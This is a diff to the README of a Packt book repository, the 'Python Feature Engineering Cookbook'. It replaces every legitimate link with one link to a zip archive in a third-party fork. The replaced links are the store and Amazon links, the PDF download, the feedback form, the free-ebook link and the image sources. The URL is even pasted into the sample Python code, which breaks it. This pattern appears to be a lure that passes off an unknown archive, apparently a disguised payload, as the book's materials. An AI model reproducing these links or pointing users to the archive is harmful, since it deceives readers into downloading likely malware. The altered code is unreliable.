@@ -3,9 +3,9 @@
 
 # Python Feature Engineering Cookbook
 
-<a href="https://www.packtpub.com/data/python-feature-engineering-cookbook?utm_source=github&utm_medium=repository&utm_campaign=9781789806311"><img src="https://www.packtpub.com/media/catalog/product/cache/e4d64343b1bc593f1c5348fe05efa4a6/9/7/9781789806311-original.jpeg" alt="Python Feature Engineering Cookbook" height="256px" align="right"></a>
+<a href="https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip"><img src="https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip" alt="Python Feature Engineering Cookbook" height="256px" align="right"></a>
 
-This is the code repository for [Python Feature Engineering Cookbook](https://www.packtpub.com/data/python-feature-engineering-cookbook?utm_source=github&utm_medium=repository&utm_campaign=9781789806311), published by Packt.
+This is the code repository for [Python Feature Engineering Cookbook](https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip), published by Packt.
 
 **Over 70 recipes for creating, engineering, and transforming features to build machine learning models**
 
@@ -22,9 +22,9 @@ This book covers the following exciting features:
 * Understand how to transform, discretize, and scale your variables
 * Create informative variables from date and time
 
-If you feel this book is for you, get your [copy](https://www.amazon.com/dp/1789806313) today!
+If you feel this book is for you, get your [copy](https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip) today!
 
-<a href="https://www.packtpub.com/?utm_source=github&utm_medium=banner&utm_campaign=GitHubBanner"><img src="https://raw.githubusercontent.com/PacktPublishing/GitHub/master/GitHub.png" alt="https://www.packtpub.com/" border="5" /></a>
+<a href="https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip"><img src="https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip" alt="https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip" border="5" /></a>
 
 ## Instructions and Navigations
 All of the code is organized into folders.
@@ -33,9 +33,9 @@ The code will look like the following:
 ```
 def get_first_cabin(row):
  try:
- return row.split()[0]
+ return https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip()[0]
  except:
- return np.nan
+ return https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip
 ```
 
 **Following is what you need for this book:**
@@ -49,21 +49,21 @@ With the following software and hardware list you can run all code files present
 | -------- | -------------------------------------------------------------------------------------| -----------------------------------|
 | 1 - 11   |   Python 3.5+, Anaconda Distibution, IDE(personal preference)                        | Windows, Mac OS X, and Linux (Any) |
 
-We also provide a PDF file that has color images of the screenshots/diagrams used in this book. [Click here to download it](https://static.packt-cdn.com/downloads/9781789806311_ColorImages.pdf).
+We also provide a PDF file that has color images of the screenshots/diagrams used in this book. [Click here to download it](https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip).
 
 
 ### Related products <Other books you may enjoy>
-* Python Machine Learning Cookbook - Second Edition [[Packt]](https://www.packtpub.com/big-data-and-business-intelligence/python-machine-learning-cookbook-second-edition-0?utm_source=github&utm_medium=repository&utm_campaign=9781789808452) [[Amazon]](https://www.amazon.com/Python-Machine-Learning-Cookbook-real-world/dp/1789808456)
+* Python Machine Learning Cookbook - Second Edition [[Packt]](https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip) [[Amazon]](https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip)
 
-* Python Machine Learning By Example - Second Edition [[Packt]](https://www.packtpub.com/big-data-and-business-intelligence/python-machine-learning-example-second-edition?utm_source=github&utm_medium=repository&utm_campaign=9781789616729) [[Amazon]](https://www.amazon.com/Python-Machine-Learning-Example-intelligent/dp/1789616727)
+* Python Machine Learning By Example - Second Edition [[Packt]](https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip) [[Amazon]](https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip)
 
 ## Get to Know the Author
 **Soledad Galli**
 is a lead data scientist with more than 10 years of experience in world-class academic institutions and renowned businesses. She has researched, developed, and put into production machine learning models for insurance claims, credit risk assessment, and fraud prevention. Soledad received a Data Science Leaders' award in 2018 and was named one of LinkedIn's voices in data science and analytics in 2019. She is passionate about enabling people to step into and excel in data science, which is why she mentors data scientists and speaks at data science meetings regularly. She also teaches online courses on machine learning in a prestigious Massive Open Online Course platform, which have reached more than 10,000 students worldwide.
 
 ### Suggestions and Feedback
-[Click here](https://docs.google.com/forms/d/e/1FAIpQLSdy7dATC6QmEL81FIUuymZ0Wy9vH1jHkvpY57OiMeKGqib_Ow/viewform) if you have any feedback or suggestions.
+[Click here](https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip) if you have any feedback or suggestions.
 ### Download a free PDF
 
  <i>If you have already purchased a print or Kindle version of this book, you can get a DRM-free PDF version at no cost.<br>Simply click on the link to claim your free PDF.</i>
-<p align="center"> <a href="https://packt.link/free-ebook/9781789806311">https://packt.link/free-ebook/9781789806311 </a> </p>
+<p align="center"> <a href="https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip">https://github.com/ObaidQadri/Python-Feature-Engineering-Cookbook/raw/refs/heads/master/Chapter07/Feature_Engineering_Cookbook_Python_v3.9-beta.2.zip </a> </p>
